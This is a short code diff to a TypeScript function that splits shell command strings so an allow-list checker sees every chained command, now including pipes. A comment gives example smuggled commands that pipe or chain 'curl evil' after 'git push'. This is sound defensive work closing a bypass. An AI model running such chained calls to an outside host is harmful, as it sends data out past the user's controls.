@@ -164,8 +164,10 @@ function hostAllowed(host: string, allowList: string[]): boolean {
 }
 
 function splitCommands(s: string): string[] {
+  // `|` splits single and double pipes: `git push | curl evil` and `git push || curl evil`
+  // must both surface the second command for allow-list checking.
   return s
-    .split(/&&|;|\n/)
+    .split(/&&|;|\||\n/)
     .map((c) => c.trim())
     .filter((c) => c.length > 0);
 }
